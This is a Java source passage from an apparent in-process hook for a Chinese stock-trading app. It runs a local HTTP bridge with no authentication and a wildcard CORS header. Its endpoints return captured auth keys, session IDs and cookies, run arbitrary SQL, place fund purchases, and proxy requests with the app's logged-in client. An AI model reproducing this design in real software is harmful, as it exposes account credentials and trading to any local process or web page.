            // 读取 HTTP 请求行
            String requestLine = reader.readLine();
            if (requestLine == null) { client.close(); return; }

            if ("THSSTREAM/1".equals(requestLine)) {
                client.setSoTimeout(0);
                handleNativeRealtimeStream(
                        client,
                        reader,
                        out,
                        resolveAppClassLoader(cl));
                return;
            }

            // 读取 headers
            int contentLength = 0;
            String line;
            while ((line = reader.readLine()) != null && !line.isEmpty()) {
                if (line.toLowerCase().startsWith("content-length:")) {
                    contentLength = Integer.parseInt(line.substring(15).trim());
                }
            }

            // 读取 body
            String body = "";
            if (contentLength > 0) {
                char[] buf = new char[contentLength];
                int read = 0;
                while (read < contentLength) {
                    int n = reader.read(buf, read, contentLength - read);
                    if (n == -1) break;
                    read += n;
                }
                body = new String(buf, 0, read);
            }

            Log.i(TAG, "Proxy request: " + requestLine + " body=" + body.substring(0, Math.min(200, body.length())));

            if (requestLine.startsWith("GET /health")) {
                sendResponse(out, 200, "{\"ok\":true,\"mode\":\"injected_core_probe\""
                        + ",\"build\":\"20260804-single-bridge-adaptive-v8\""
                        + ",\"android_user_id\":" + androidUserId()
                        + ",\"pid\":" + android.os.Process.myPid()
                        + ",\"listen_port\":" + proxyPortForCurrentUser()
                        + ",\"realtime_stream_sessions\":"
                        + realtimeStreamSessions.get() + "}");
                client.close();
                return;
            }

            if (requestLine.startsWith("GET /native/wire-capture")) {
                sendResponse(out, 200, readMarketWireCapture());
                client.close();
                return;
            }

            if (requestLine.startsWith("POST /native/table-capture/reset")) {
                resetStuffTableCapture();
                sendResponse(out, 200, "{\"success\":true}");
                client.close();
                return;
            }

            if (requestLine.startsWith("GET /native/table-capture")) {
                sendResponse(out, 200, readStuffTableCapture());
                client.close();
                return;
            }

            if (requestLine.startsWith("POST /native/indicator-capture/reset")) {
                resetIndicatorQueryCapture();
                sendResponse(out, 200, "{\"success\":true}");
                client.close();
                return;
            }

            if (requestLine.startsWith("GET /native/indicator-capture")) {
                sendResponse(out, 200, readIndicatorQueryCapture());
                client.close();
                return;
            }

            if (requestLine.startsWith("POST /native/hurricane")
                    || requestLine.startsWith("POST /native/indicator-list")) {
                ClassLoader effectiveClassLoader = resolveAppClassLoader(cl);
                String result = callNativeHurricaneQuery(body, effectiveClassLoader);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // 无需 WebView，直接调用 App 内部的实时行情请求核心。
            if (requestLine.startsWith("POST /native/realtime")) {
                ClassLoader effectiveClassLoader = resolveAppClassLoader(cl);
                String result = callNativeRealTimeData(body, effectiveClassLoader);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // 无需 WebView，直接调用 App 内部的 UnifiedRequest 核心。
            if (requestLine.startsWith("POST /native/unified")) {
                ClassLoader effectiveClassLoader = resolveAppClassLoader(cl);
                String result = callNativeUnifiedRequest(body, effectiveClassLoader);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            if (requestLine.startsWith("POST /native/ranking-debug")) {
                ClassLoader effectiveClassLoader = resolveAppClassLoader(cl);
                String result = callNativeRankingDebug(body, effectiveClassLoader);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // 调试端点: GET /domains
            if (requestLine.startsWith("GET /domains")) {
                StringBuilder sb = new StringBuilder("{\"domains\":[");
                boolean first = true;
                for (String d : domainClients.keySet()) {
                    if (!first) sb.append(",");
                    sb.append("\"").append(d).append("\"");
                    first = false;
                }
                sb.append("],\"total_clients\":").append(allClients.size());
                sb.append(",\"interceptor_map_size\":").append(interceptorClientMap.size()).append("}");
                sendResponse(out, 200, sb.toString());
                client.close();
                return;
            }

            // 认证端点: GET /auth — 返回最新捕获的交易认证参数
            if (requestLine.startsWith("GET /auth")) {
                StringBuilder sb = new StringBuilder("{");
                sb.append("\"key1\":\"").append(latestKey1 != null ? latestKey1 : "").append("\"");
                sb.append(",\"key2\":\"").append(latestKey2 != null ? latestKey2 : "").append("\"");
                sb.append(",\"key3\":\"").append(latestKey3 != null ? latestKey3 : "").append("\"");
                sb.append(",\"key4\":\"").append(latestKey4 != null ? latestKey4 : "").append("\"");
                sb.append(",\"key5\":\"").append(latestKey5 != null ? latestKey5 : "").append("\"");
                sb.append(",\"userId\":\"").append(latestUserId != null ? latestUserId : "").append("\"");
                sb.append(",\"sessionId\":\"").append(latestSessionId != null ? latestSessionId : "").append("\"");
                sb.append(",\"cookie\":\"").append(latestCookie != null ? latestCookie.replace("\"", "\\\"") : "").append("\"");
                sb.append(",\"hexin_v\":\"").append(latestHexinV != null ? latestHexinV.replace("\"", "\\\"") : "").append("\"");
                sb.append(",\"capture_time\":").append(authCaptureTime);
                sb.append(",\"available\":").append(latestKey5 != null);
                sb.append("}");
                sendResponse(out, 200, sb.toString());
                client.close();
                return;
            }

            // 基金购买端点: POST /fund/buy_direct — 直接调用app内部购买方法（优先匹配，避免被 /fund/buy 误匹配）
            if (requestLine.startsWith("POST /fund/buy_direct")) {
                String result = directBuyFund(body);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // 基金购买端点: POST /fund/buy — 通过 WebView 触发购买（已废弃，用户不接受UI自动化）
            if (requestLine.startsWith("POST /fund/buy")) {
                String result = triggerFundBuy(body);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // 打开基金详情页面: POST /fund/open_detail — 触发WebView创建和JSBridge初始化
            if (requestLine.startsWith("POST /fund/open_detail")) {
                String result = openFundDetail(body);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // ========== 股票数据查询端点 ==========

            // GET /stock/positions — 查询持仓
            if (requestLine.startsWith("GET /stock/positions")) {
                String result = queryStockPositions();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/assets — 查询资产
            if (requestLine.startsWith("GET /stock/assets")) {
                String result = queryStockAssets();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/orders — 查询委托
            if (requestLine.startsWith("GET /stock/orders")) {
                String result = queryStockOrders();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/history — 查询历史成交
            if (requestLine.startsWith("GET /stock/history")) {
                String result = queryStockHistory();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/daily — 查询当日成交
            if (requestLine.startsWith("GET /stock/daily")) {
                String result = queryStockDaily();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/status — 检查数据库状态
            if (requestLine.startsWith("GET /stock/status")) {
                String result = getStockDbStatus();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/schema?table=xxx — 查询表结构
            if (requestLine.startsWith("GET /stock/schema")) {
                String table = null;
                int qIdx = requestLine.indexOf("?table=");
                if (qIdx != -1) {
                    int endIdx = requestLine.indexOf(" ", qIdx);
                    if (endIdx == -1) endIdx = requestLine.length();
                    table = requestLine.substring(qIdx + 7, endIdx);
                }
                String result = queryTableSchema(table);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // ========== JSBridge 转发端点 ==========

            // POST /jsbridge — 通过 WebView 调用 JSBridge
            if (requestLine.startsWith("POST /jsbridge")) {
                String result = callJSBridge(body);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/query?sql=xxx — 执行任意查询（调试用）
            if (requestLine.startsWith("GET /stock/query")) {
                int qIdx = requestLine.indexOf("?sql=");
                if (qIdx == -1) {
                    sendResponse(out, 400, "{\"error\":\"missing sql parameter\"}");
                    client.close();
                    return;
                }
                int endIdx = requestLine.indexOf(" ", qIdx);
                if (endIdx == -1) endIdx = requestLine.length();
                String sql = java.net.URLDecoder.decode(requestLine.substring(qIdx + 5, endIdx), "UTF-8");
                String result = executeStockQuery(sql, null);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/databases — 列出所有数据库文件
            if (requestLine.startsWith("GET /stock/databases")) {
                String result = listDatabases();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/opendb?path=xxx — 打开指定数据库并列出表
            if (requestLine.startsWith("GET /stock/opendb")) {
                int qIdx = requestLine.indexOf("?path=");
                if (qIdx == -1) {
                    sendResponse(out, 400, "{\"error\":\"missing path parameter\"}");
                    client.close();
                    return;
                }
                int endIdx = requestLine.indexOf(" ", qIdx);
                if (endIdx == -1) endIdx = requestLine.length();
                String dbPath = java.net.URLDecoder.decode(requestLine.substring(qIdx + 6, endIdx), "UTF-8");
                String result = openAndListTables(dbPath);
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/trade/status — 获取交易 SDK 状态
            if (requestLine.startsWith("GET /stock/trade/status")) {
                String result = getTradeStatus();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/trade/logs — 获取最近的交易日志
            if (requestLine.startsWith("GET /stock/trade/logs")) {
                String result = getRecentTradeLogs();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/trade/sdk-schema — 只返回运行时交易 SDK 的类型和方法签名。
            // 不返回账户、令牌、请求参数或业务数据。
            if (requestLine.startsWith("GET /stock/trade/sdk-schema")) {
                String result = getTradeSdkSchema();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/trade/positions — 进程内只读调用器：重放 App 自己的
            // 资金持仓查询（H(2624,1891)+wt_account），返回持仓表格数据。
            // 前置条件：App 已进过一次持仓页（捕获账户与参数）。
            if (requestLine.startsWith("GET /stock/trade/positions")) {
                String result = invokeZjccQuery();
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // GET /stock/trade/query?name=positions|today_order|today_deal|hist_order|hist_deal
            // — 通用只读查询调用器（按协议名重放捕获的查询）
            if (requestLine.startsWith("GET /stock/trade/query")) {
                int qIdx = requestLine.indexOf("?name=");
                String name = qIdx == -1 ? null
                        : requestLine.substring(qIdx + 6, requestLine.indexOf(" ", qIdx) == -1
                                ? requestLine.length() : requestLine.indexOf(" ", qIdx));
                String result = name == null
                        ? errorJson(new JSONObject(), "missing ?name= parameter")
                        : invokeTradeQueryByName(name.trim());
                sendResponse(out, 200, result);
                client.close();
                return;
            }

            // 调试端点: GET /clients — 列出所有 client 及其 CookieJar 信息
            if (requestLine.startsWith("GET /clients")) {
                StringBuilder sb = new StringBuilder("{\"clients\":[");
                synchronized (allClients) {
                    for (int i = 0; i < allClients.size(); i++) {
                        if (i > 0) sb.append(",");
                        Object c = allClients.get(i);
                        sb.append("{\"index\":").append(i);
                        sb.append(",\"class\":\"").append(c.getClass().getName()).append("\"");
                        // 尝试获取 cookieJar 信息
                        try {
                            Method cookieJarM = c.getClass().getDeclaredMethod("cookieJar");
                            if (!cookieJarM.isAccessible()) cookieJarM.setAccessible(true);
                            Object cj = cookieJarM.invoke(c);
                            sb.append(",\"cookieJar\":\"").append(cj.getClass().getName()).append("\"");
                        } catch (Throwable e) {
                            sb.append(",\"cookieJar\":\"unknown\"");
                        }
                        sb.append("}");
                    }
                }
                sb.append("]}");
                sendResponse(out, 200, sb.toString());
                client.close();
                return;
            }

            // 解析 JSON body
            String targetUrl = extractJsonString(body, "url");
            String method = extractJsonString(body, "method");
            String reqBody = extractJsonString(body, "body");
            String contentType = extractJsonString(body, "content_type");
            String clientIdxStr = extractJsonString(body, "client_index");
            String extraHeadersJson = extractJsonObject(body, "extra_headers");

            if (targetUrl == null || targetUrl.isEmpty()) {
                sendResponse(out, 400, "{\"error\":\"missing url field\"}");
                client.close();
                return;
            }
            if (method == null) method = "GET";

            // 选择 OkHttpClient
            Object okClient = null;

            // 1. 如果指定了 client_index，使用该索引的客户端
            if (clientIdxStr != null) {
                try {
                    int idx = Integer.parseInt(clientIdxStr);
                    if (idx >= 0 && idx < allClients.size()) {
                        okClient = allClients.get(idx);
                        Log.i(TAG, "Proxy using client[" + idx + "]");
                    }
                } catch (Throwable ignored) {}
            }

            // 2. 按域名匹配
            if (okClient == null) {
                String targetDomain = extractDomain(targetUrl);
                if (targetDomain != null) {
                    okClient = domainClients.get(targetDomain);
                    if (okClient != null) {
                        Log.i(TAG, "Proxy using domain-matched client for: " + targetDomain);
                    }
                }
            }

            // 3. 使用第一个捕获的客户端
            if (okClient == null && !allClients.isEmpty()) {
                okClient = allClients.get(0);
                Log.i(TAG, "Proxy using first available client");
            }

            if (okClient == null) {
                sendResponse(out, 503, "{\"error\":\"No OkHttpClient captured yet\"}");
                client.close();
                return;
            }

            // 使用选中的 OkHttpClient 发起请求
            try {
                ClassLoader bcl = okClient.getClass().getClassLoader();
                Class<?> requestClass = bcl.loadClass("okhttp3.Request");
                Class<?> builderClass = bcl.loadClass("okhttp3.Request$Builder");
                Class<?> requestBodyClass = bcl.loadClass("okhttp3.RequestBody");
                Class<?> mediaTypeClass = bcl.loadClass("okhttp3.MediaType");

                // 构建 Request
                Object builder = builderClass.getDeclaredConstructor().newInstance();
                Method urlMethod = builderClass.getDeclaredMethod("url", String.class);
                builder = urlMethod.invoke(builder, targetUrl);

                // Hummer 发现页推荐流要求 HXJsBridge.getUserCookie()。Cookie 仅在
                // App 进程内注入请求，不通过桥接响应、业务参数或日志向外暴露。
                if (targetUrl.startsWith("https://recommend.10jqka.com.cn/app/discover/")) {
                    try {
                        Class<?> bridgeClass = resolveAppClassLoader(cl).loadClass(
                                "com.hexin.android.base_hummer.export.component.business.HXJsBridge");
                        Object cookieValue = bridgeClass.getDeclaredMethod("getUserCookie").invoke(null);
                        String hummerCookie = cookieValue != null ? String.valueOf(cookieValue) : "";
                        if (!hummerCookie.isEmpty()) {
                            Method addHeaderMethod = builderClass.getDeclaredMethod(
                                    "addHeader", String.class, String.class);
                            builder = addHeaderMethod.invoke(builder, "Cookie", hummerCookie);
                            Log.i(TAG, "Proxy injected Hummer user cookie for discover recommend");
                        } else {
                            Log.w(TAG, "Hummer user cookie is empty for discover recommend");
                        }
                    } catch (Throwable cookieError) {
                        Log.w(TAG, "Inject Hummer user cookie failed: "
                                + cookieError.getClass().getSimpleName());
                    }
                }

                // 添加额外的 headers
                if (extraHeadersJson != null && !extraHeadersJson.isEmpty()) {
                    Method addHeaderMethod = builderClass.getDeclaredMethod("addHeader", String.class, String.class);
                    // 简单解析 JSON object: {"key1":"value1","key2":"value2"}
                    String inner = extraHeadersJson.trim();
                    if (inner.startsWith("{")) inner = inner.substring(1);
                    if (inner.endsWith("}")) inner = inner.substring(0, inner.length() - 1);
                    String[] pairs = inner.split(",");
                    for (String pair : pairs) {
                        int colonIdx = pair.indexOf(":");
                        if (colonIdx > 0) {
                            String key = pair.substring(0, colonIdx).trim();
                            String value = pair.substring(colonIdx + 1).trim();
                            // 去掉引号
                            if (key.startsWith("\"") && key.endsWith("\"")) key = key.substring(1, key.length() - 1);
                            if (value.startsWith("\"") && value.endsWith("\"")) value = value.substring(1, value.length() - 1);
                            if (!key.isEmpty()) {
                                builder = addHeaderMethod.invoke(builder, key, value);
                                Log.i(TAG, "Proxy added header: " + key + "=" + value);
                            }
                        }
                    }
                }

                // 设置请求体
                if ("POST".equalsIgnoreCase(method) || "PUT".equalsIgnoreCase(method)) {
                    if (contentType == null || contentType.isEmpty()) {
                        contentType = "application/x-www-form-urlencoded";
                    }
                    Object mediaType = mediaTypeClass.getDeclaredMethod("parse", String.class)
                            .invoke(null, contentType);
                    Object requestBodyObj = requestBodyClass.getDeclaredMethod("create", mediaTypeClass, String.class)
                            .invoke(null, mediaType, reqBody != null ? reqBody : "");
                    Method methodM = builderClass.getDeclaredMethod("method", String.class, requestBodyClass);
                    builder = methodM.invoke(builder, method.toUpperCase(), requestBodyObj);
                }

                Method buildMethod = builderClass.getDeclaredMethod("build");
                Object request = buildMethod.invoke(builder);

                // 执行请求
                Method newCallMethod = okClient.getClass().getDeclaredMethod("newCall",
                        bcl.loadClass("okhttp3.Request"));
                Object call = newCallMethod.invoke(okClient, request);
                Method executeMethod = call.getClass().getDeclaredMethod("execute");
                Object response = executeMethod.invoke(call);

                // 读取响应
                int code = (int) response.getClass().getDeclaredMethod("code").invoke(response);
                Object responseBody = response.getClass().getDeclaredMethod("body").invoke(response);
                String responseStr = "";
                if (responseBody != null) {
                    try {
                        responseStr = (String) responseBody.getClass().getDeclaredMethod("string").invoke(responseBody);
                    } catch (Throwable e1) {
                        try {
                            Object source = responseBody.getClass().getMethod("source").invoke(responseBody);
                            Object buffer = bcl.loadClass("okio.Buffer").getDeclaredConstructor().newInstance();
                            Method readAll = source.getClass().getMethod("readAll", bcl.loadClass("okio.Sink"));
                            readAll.invoke(source, buffer);
                            responseStr = (String) buffer.getClass().getMethod("readUtf8").invoke(buffer);
                        } catch (Throwable e2) {
                            try {
                                byte[] bytes = (byte[]) responseBody.getClass().getMethod("bytes").invoke(responseBody);
                                responseStr = new String(bytes, "UTF-8");
                            } catch (Throwable e3) {
                                responseStr = "{\"error\":\"Cannot read response body: " + e3.getMessage() + "\"}";
                            }
                        }
                    }
                }

                Log.i(TAG, "Proxy response: " + code + " len=" + responseStr.length());
                sendResponse(out, code, responseStr);

            } catch (Throwable e) {
                Log.e(TAG, "Proxy request failed: " + e.getMessage());
                org.json.JSONObject errorBody = new org.json.JSONObject();
                try {
                    errorBody.put("success", false);
                    errorBody.put("error", String.valueOf(e.getMessage()));
                } catch (Throwable ignored) {
                    // String-valued JSON should not fail. Keep a valid body
                    // when QueryParam exception text contains raw newlines.
                }
                sendResponse(out, 500, errorBody.toString());
            }

            client.close();
        } catch (Throwable e) {
            try { client.close(); } catch (Throwable ignored) {}
        }
    }

    private static void sendResponse(OutputStream out, int code, String body) throws java.io.IOException {
        String status = code == 200 ? "OK" : (code == 503 ? "Service Unavailable" : "Error");
        byte[] bodyBytes = body.getBytes("UTF-8");
        String header = "HTTP/1.1 " + code + " " + status + "\r\n"
                + "Content-Type: application/json; charset=utf-8\r\n"
                + "Content-Length: " + bodyBytes.length + "\r\n"
                + "Access-Control-Allow-Origin: *\r\n"
                + "Connection: close\r\n"
                + "\r\n";
        out.write(header.getBytes("UTF-8"));
        out.write(bodyBytes);
        out.flush();
    }

    private static void handleNativeRealtimeStream(
            Socket socket,
            BufferedReader reader,
            OutputStream out,
            ClassLoader cl) {
        NativeRealtimeStreamSession session = new NativeRealtimeStreamSession(
                socket,
                reader,
                out,
                cl);
        session.run();
    }

    private static final class NativeRealtimeStreamSession {
        private final Socket socket;
        private final BufferedReader reader;
        private final OutputStream out;
        private final ClassLoader classLoader;
        private final Object writeLock = new Object();
        private final BlockingQueue<String> writeQueue = new ArrayBlockingQueue<>(128);
        private final ConcurrentHashMap<String, Object> realtimeSubscriptions =
                new ConcurrentHashMap<>();
        private final ConcurrentHashMap<String, UnifiedSubscriptionState>
                unifiedSubscriptions =
                new ConcurrentHashMap<>();
        private final AtomicLong sequence = new AtomicLong(0);
        private final AtomicBoolean closed = new AtomicBoolean(false);
        private final AtomicBoolean sessionRegistered = new AtomicBoolean(false);
        private final ThreadPoolExecutor requestExecutor = new ThreadPoolExecutor(
                1,
                1,
                0L,
                TimeUnit.MILLISECONDS,
                new ArrayBlockingQueue<Runnable>(128),
                runnable -> new Thread(runnable, "THSHook-RT-Command"),
                new ThreadPoolExecutor.AbortPolicy());
        private Thread writerThread;
        private PowerManager.WakeLock wakeLock;

        NativeRealtimeStreamSession(
                Socket socket,
                BufferedReader reader,
                OutputStream out,
                ClassLoader classLoader) {
            this.socket = socket;
            this.reader = reader;
            this.out = out;
            this.classLoader = classLoader;
        }

        void run() {
            sessionRegistered.set(true);
            int activeSessions = realtimeStreamSessions.incrementAndGet();
            Log.i(TAG, "RT_STREAM opened activeSessions=" + activeSessions);
            try {
                acquireWakeLock();
                startWriter();
                writeLine("{\"type\":\"hello\",\"protocol\":\"THSSTREAM/1\""
                        + ",\"android_user_id\":" + androidUserId()
                        + ",\"pid\":" + android.os.Process.myPid() + "}");
                String commandLine;
                while (!closed.get() && (commandLine = reader.readLine()) != null) {
                    handleCommand(commandLine);
                }
            } catch (Throwable e) {
                if (!closed.get()) {
                    Log.w(TAG, "Native realtime stream ended: " + e.getMessage());
                }
            } finally {
                close();
            }
        }

        private void handleCommand(String commandLine) {
            if (commandLine == null || commandLine.trim().isEmpty()) {
                return;
            }
            String subscriptionId = "";
            String requestId = "";
            String route = "";
            try {
                org.json.JSONObject command = new org.json.JSONObject(commandLine);
                String operation = command.optString("op", "").trim();
                subscriptionId = command.optString("subscription_id", "").trim();
                requestId = command.optString("request_id", "").trim();
                route = command.optString("route", "").trim();
                Log.i(TAG, "RT_STREAM command op=" + operation
                        + " id=" + subscriptionId
                        + " kind=" + command.optString("kind", ""));
                if ("ping".equals(operation)) {
                    writeLine("{\"type\":\"pong\",\"sequence\":"
                            + sequence.incrementAndGet() + "}");
                    return;
                }
                if ("list".equals(operation)) {
                    org.json.JSONArray values = new org.json.JSONArray();
                    for (String value : realtimeSubscriptions.keySet()) {
                        values.put(value);
                    }
                    for (String value : unifiedSubscriptions.keySet()) {
                        values.put(value);
                    }
                    writeLine("{\"type\":\"subscriptions\",\"subscription_ids\":"
                            + values.toString() + "}");
                    return;
                }
                if ("unsubscribe".equals(operation)) {
                    if (subscriptionId.isEmpty()) {
                        throw new IllegalArgumentException("subscription_id is required");
                    }
                    unsubscribe(subscriptionId);
                    writeLine("{\"type\":\"unsubscribed\",\"subscription_id\":\""
                            + esc(subscriptionId) + "\"}");
                    return;
                }
                if ("request".equals(operation)) {
                    submitRequest(command);
                    return;
                }
                if (!"subscribe".equals(operation)) {
                    throw new IllegalArgumentException("unsupported op: " + operation);
                }
                String kind = command.optString("kind", "realtime").trim();
                if ("unified".equals(kind)) {
                    String onlineId = command.optString("online_id", "").trim();
                    int protocolId = command.optInt("protocol_id", -1);
                    int pageId = command.optInt("page_id", -1);
                    int requestType = command.optInt("request_type", 262144);
                    String requestDic = command.optString("request_dic", "");
                    String cancelRequestDic = command.optString(
                            "cancel_request_dic", "");
                    if (subscriptionId.isEmpty() || onlineId.isEmpty()
                            || protocolId < 0 || pageId < 0 || requestDic.isEmpty()) {
                        throw new IllegalArgumentException(
                                "subscription_id, online_id, protocol_id, page_id "
                                        + "and request_dic are required");
                    }
                    subscribeUnified(
                            subscriptionId,
                            onlineId,
                            protocolId,
                            pageId,
                            requestType,
                            requestDic,
                            cancelRequestDic);
                    Log.i(TAG, "RT_STREAM subscribed unified id=" + subscriptionId
                            + " onlineId=" + onlineId + " pageId=" + pageId);
                    writeLine("{\"type\":\"subscribed\",\"subscription_id\":\""
                            + esc(subscriptionId) + "\",\"kind\":\"unified\"}");
                    return;
                }
                if (!"realtime".equals(kind)) {
                    throw new IllegalArgumentException(
                            "unsupported subscription kind: " + kind);
                }
                String key = command.optString("key", "").trim();
                String requestParam = command.optString("request_param", "");
                String requestChannel = command.optString("request_channel", "").trim();
                if (subscriptionId.isEmpty() || key.isEmpty()
                        || requestParam.isEmpty() || requestChannel.isEmpty()) {
                    throw new IllegalArgumentException(
                            "subscription_id, key, request_param and request_channel are required");
                }
                subscribe(subscriptionId, key, requestParam, requestChannel);
                Log.i(TAG, "RT_STREAM subscribed id=" + subscriptionId
                        + " key=" + key + " channel=" + requestChannel);
                writeLine("{\"type\":\"subscribed\",\"subscription_id\":\""
                        + esc(subscriptionId) + "\",\"key\":\"" + esc(key) + "\"}");
            } catch (Throwable e) {
                writeLine("{\"type\":\"error\",\"subscription_id\":\""
                        + esc(subscriptionId) + "\",\"request_id\":\""
                        + esc(requestId) + "\",\"route\":\""
                        + esc(route) + "\",\"error\":\""
                        + esc(e.getClass().getSimpleName() + ": " + String.valueOf(e.getMessage()))
                        + "\"}");
            }
        }

        private void submitRequest(org.json.JSONObject command) {
            String requestId = command.optString("request_id", "").trim();
            String route = command.optString("route", "").trim();
            org.json.JSONObject payload = command.optJSONObject("payload");
            if (requestId.isEmpty() || route.isEmpty() || payload == null) {
                throw new IllegalArgumentException(
                        "request_id, route and payload are required");
            }
            requestExecutor.execute(() -> {
                try {
                    String raw;
                    if ("unified".equals(route)) {
                        raw = callNativeUnifiedRequest(
                                payload.toString(), classLoader);
                    } else if ("hurricane".equals(route)) {
                        raw = callNativeHurricaneQuery(
                                payload.toString(), classLoader);
                    } else if ("ranking".equals(route)) {
                        raw = callNativeRankingDebug(
                                payload.toString(), classLoader);
                    } else if ("realtime".equals(route)) {
                        raw = callNativeRealTimeData(
                                payload.toString(), classLoader);
                    } else {
                        throw new IllegalArgumentException(
                                "unsupported request route: " + route);
                    }
                    Object decoded = new org.json.JSONTokener(raw).nextValue();
                    org.json.JSONObject response = new org.json.JSONObject();
                    response.put("type", "response");
                    response.put("request_id", requestId);
                    response.put("route", route);
                    response.put("payload", decoded);
                    writeLine(response.toString());
                } catch (Throwable error) {
                    writeLine("{\"type\":\"error\",\"request_id\":\""
                            + esc(requestId) + "\",\"route\":\""
                            + esc(route) + "\",\"error\":\""
                            + esc(error.getClass().getSimpleName() + ": "
                                    + String.valueOf(error.getMessage()))
                            + "\"}");
                }
            });
        }

        private void subscribe(
                String subscriptionId,
                String key,
                String requestParam,
                String requestChannel) throws Exception {
            unsubscribe(subscriptionId);
            CountDownLatch started = new CountDownLatch(1);
            AtomicReference<Throwable> failure = new AtomicReference<>();
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Object application = currentApplication();
                    if (application == null) {
                        throw new IllegalStateException("Application is not ready");
                    }
                    startLegacyCommunicationService(application, classLoader);
                    RealtimeClassSet realtimeClasses = resolveRealtimeClassSet(classLoader);
                    Class<?> modelClass = realtimeClasses.modelClass;
                    Object model = newRealtimeRequestModel(
                            modelClass, key, requestParam, requestChannel);
                    Class<?> clientClass = realtimeClasses.clientClass;
                    Class<?> callbackClass = realtimeClasses.callbackClass;
                    Object nativeClient = clientClass.getConstructor(modelClass).newInstance(model);
                    Object callback = Proxy.newProxyInstance(
                            classLoader,
                            new Class<?>[]{callbackClass},
                            (proxy, method, args) -> {
                                if (args == null || args.length != 1 || args[0] == null) {
                                    return null;
                                }
                                try {
                                    Object result = args[0];
                                    int status = ((Number) result.getClass()
                                            .getMethod("d").invoke(result)).intValue();
                                    int responseType = ((Number) result.getClass()
                                            .getMethod("b").invoke(result)).intValue();
                                    String responseKey = String.valueOf(result.getClass()
                                            .getMethod("c").invoke(result));
                                    Object dataValue = result.getClass()
                                            .getMethod("a").invoke(result);
                                    String data = dataValue == null
                                            ? null
                                            : String.valueOf(dataValue);
                                    Log.i(TAG, "RT_STREAM event id=" + subscriptionId
                                            + " status=" + status
                                            + " responseType=" + responseType
                                            + " key=" + responseKey
                                            + " bytes=" + (data == null ? 0 : data.length()));
                                    writeLine("{\"type\":\"event\",\"subscription_id\":\""
                                            + esc(subscriptionId)
                                            + "\",\"topic\":\"realtime\",\"sequence\":"
                                            + sequence.incrementAndGet()
                                            + ",\"status\":" + status
                                            + ",\"response_type\":" + responseType
                                            + ",\"key\":\"" + esc(responseKey) + "\""
                                            + ",\"data\":" + jsonValue(data)
                                            + ",\"emitted_at\":" + System.currentTimeMillis()
                                            + "}");
                                } catch (Throwable callbackError) {
                                    writeLine("{\"type\":\"error\",\"subscription_id\":\""
                                            + esc(subscriptionId)
                                            + "\",\"error\":\"callback: "
                                            + esc(String.valueOf(callbackError.getMessage())) + "\"}");
                                }
                                return null;
                            });
                    clientClass.getMethod("e", callbackClass).invoke(nativeClient, callback);
                    realtimeSubscriptions.put(subscriptionId, nativeClient);
                    clientClass.getMethod("d").invoke(nativeClient);
                    if (closed.get()) {
                        Object removed = realtimeSubscriptions.remove(subscriptionId);
                        cleanupRealTimeDataClient(removed);
                    }
                } catch (Throwable e) {
                    Object failedClient = realtimeSubscriptions.remove(subscriptionId);
                    cleanupRealTimeDataClient(failedClient);
                    failure.set(e);
                } finally {
                    started.countDown();
                }
            });
            if (!started.await(10, TimeUnit.SECONDS)) {
                throw new IllegalStateException("native subscription dispatch timed out");
            }
            if (failure.get() != null) {
                throw new RuntimeException(failure.get());
            }
        }

        private void subscribeUnified(
                String subscriptionId,
                String onlineId,
                int protocolId,
                int pageId,
                int requestType,
                String requestDic,
                String cancelRequestDic) throws Exception {
            unsubscribe(subscriptionId);
            CountDownLatch started = new CountDownLatch(1);
            AtomicReference<Throwable> failure = new AtomicReference<>();
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Object application = currentApplication();
                    if (application == null) {
                        throw new IllegalStateException("Application is not ready");
                    }
                    startLegacyCommunicationService(application, classLoader);
                    Class<?> modelClass = classLoader.loadClass(
                            "com.hexin.android.base_hummer.export.component.business."
                                    + "HummerUnifiedRequestBridge$RequestModel");
                    Object model = modelClass.getConstructor().newInstance();
                    setPrivateField(model, "onlineId", onlineId);
                    setPrivateField(model, "protocolId", protocolId);
                    setPrivateField(model, "pageId", pageId);
                    setPrivateField(model, "requestDic", requestDic);
                    setPrivateField(model, "requestType", requestType);
                    setPrivateField(model, "compressType", "");
                    setPrivateField(model, "cancelRequestDic", cancelRequestDic);

                    Class<?> callbackClass = classLoader.loadClass("ld0");
                    Object callback = Proxy.newProxyInstance(
                            classLoader,
                            new Class<?>[]{callbackClass},
                            (proxy, method, args) -> {
                                String methodName = method.getName();
                                if ("call".equals(methodName)) {
                                    Object callbackValue = null;
                                    if (args != null && args.length > 0) {
                                        callbackValue = args[0];
                                        if (callbackValue instanceof Object[]) {
                                            Object[] callbackArgs = (Object[]) callbackValue;
                                            callbackValue = callbackArgs.length > 0
                                                    ? callbackArgs[0]
                                                    : null;
                                        }
                                    }
                                    if (callbackValue != null) {
                                        String payload = toJson(callbackValue);
                                        Log.i(TAG, "RT_STREAM unified event id="
                                                + subscriptionId + " onlineId=" + onlineId
                                                + " bytes=" + payload.length());
                                        writeLine("{\"type\":\"event\",\"subscription_id\":\""
                                                + esc(subscriptionId)
                                                + "\",\"topic\":\"unified\",\"sequence\":"
                                                + sequence.incrementAndGet()
                                                + ",\"data\":" + payload
                                                + ",\"emitted_at\":"
